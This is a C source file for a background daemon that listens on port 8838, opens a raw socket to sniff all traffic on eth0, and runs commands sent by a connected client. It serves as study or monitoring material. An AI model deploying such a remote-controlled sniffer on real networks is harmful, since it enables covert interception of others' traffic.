#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <pthread.h>

#include "net.h"
#include "cmd.h"

#define UNX_LOGFILE_NAME "work-task"

#define NET_SERVER_PORT           8838
#define NET_SERVER_MESSAGE_MAXLEN 512
#define NET_CLIENT_BUFFER_SIZE    512
#define NET_PACKET_BUFFER_SIZE    2048
#define NET_SOCKET_DEFAULT_IFACE  "eth0"

static void create_daemon(void) {
  pid_t program_pid = fork();

  // Fork the parent process, then destroy it. So child
  // will run in the background.
  if(program_pid < 0) {
	fprintf(stderr, "Error occured during the fork().\n");
	exit(EXIT_FAILURE);
  }

  if(program_pid > 0) {
	fprintf(stderr, "Succesfully created fork of the parent process.\n");
	exit(EXIT_SUCCESS);
  }

  // Make this process the process group leader(detach from
  // cotrolling terminal).
  if(setsid() < 0) {
	exit(EXIT_FAILURE);
  }

  signal(SIGCHLD, SIG_IGN);
  signal(SIGHUP,  SIG_IGN);

  // As soon as this process is session leader, fork
  // it again to ensure that this process cannot get
  // TTY.
  program_pid = fork();

  if(program_pid < 0) {
	exit(EXIT_FAILURE);
  }

  if(program_pid > 0) {
	exit(EXIT_SUCCESS);
  }

  // Set the new file permissions for the process
  umask(0);

  // Close all open file descriptors
  for(int fdesc = sysconf(_SC_OPEN_MAX); fdesc >= 0; --fdesc) {
	close(fdesc);
  }

  openlog(UNX_LOGFILE_NAME, LOG_PID, LOG_DAEMON);
}

int main(void) {
  create_daemon();
  net_init();

  // Allocate the space for the packets
  char* client_buffer = (char *)malloc(NET_CLIENT_BUFFER_SIZE);
		   
  // Create the server socket
  int socket_server = net_initialize_server_socket();
  if(socket_server < 0) {
    syslog(LOG_EMERG, "Daemon terminated due to an error.");


    free       (client_buffer);
    closelog   ();
    net_release();

    return EXIT_FAILURE;
  }

  // Wait until someone connects.
  listen(socket_server, 5);
  syslog(LOG_INFO, "Waiting for incoming connection");

  // Accept the connection
  int socket_client = net_accept_connection(socket_server);
  if(socket_client < 0) {
    syslog(LOG_EMERG, "Daemon terminated due to an error.");

    free       (client_buffer);
    close      (socket_server);
    net_release();
    closelog   ();

	return EXIT_FAILURE;
  }

  syslog(LOG_INFO, "Connection established!");

  // Create raw socket that is sniffing all the traffic and bind it
  // to the default iface of `eth0`.
  int socket_sniff = net_create_sniffing_socket();
  if(socket_sniff < 0) {
    syslog(LOG_EMERG, "Daemon terminated due to an error.");

    free       (client_buffer);
    close      (socket_server);
    close      (socket_client);
    net_release();
    closelog   ();

    return EXIT_FAILURE;
  }

  net_bind_socket_to_iface(socket_sniff, NET_SOCKET_DEFAULT_IFACE);
  net_bind_sniffer_socket (socket_sniff);

  // Display the welcome message to the user.
  cmd_display_welcome_message(socket_client);

  while(true) {
    bzero(client_buffer, NET_CLIENT_BUFFER_SIZE);

    // Recieve the data from the client.
    ssize_t bytes_recieved = read(socket_client, client_buffer, NET_CLIENT_BUFFER_SIZE-1);

    if(bytes_recieved < 0) {
        syslog(LOG_ERR, "Error: cannot read the data recieved from the client.");
        break;
    }

    if(bytes_recieved == 0) {
        syslog(LOG_DEBUG, "Client disconected");
        break;
    }

    if(strlen(client_buffer) >= 2) {
        client_buffer[bytes_recieved]   = '\0';
        client_buffer[bytes_recieved-1] = '\0';
    }

    // Display the prompt in the client CLI, accept commands.
    command_t command = {};
    cmd_parse_command_message(client_buffer, &command);
    cmd_command_callback     (socket_client, &socket_sniff, &command);
  }

  // Safely exit
  free       (client_buffer);
  close      (socket_server);
  close      (socket_client);
  net_release();
  closelog   ();

  return EXIT_SUCCESS;
}
